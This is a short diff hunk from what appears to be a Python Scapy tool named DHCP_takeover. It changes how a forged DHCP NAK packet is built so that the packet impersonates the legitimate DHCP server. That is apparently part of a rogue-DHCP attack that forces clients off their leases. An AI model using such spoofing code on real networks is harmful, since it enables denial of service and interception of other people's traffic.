@@ -61,7 +61,7 @@ class DHCP_takeover:
             IP(src=dhcp_server_ip, dst=packet[IP].dst) / \
             UDP(sport=67,dport=68) / \
             BOOTP(op=2, ciaddr=packet[IP].src, siaddr=packet[IP].dst, chaddr=packet[Ether].src, xid=packet[BOOTP].xid) / \
-            DHCP(options=[('server_id', self.our_dhcp_server_ip),('message-type','nak'), ('end')])
+            DHCP(options=[('server_id', dhcp_server_ip),('message-type','nak'), ('end')])
 
         print "sending NAK:"
         nak.show()
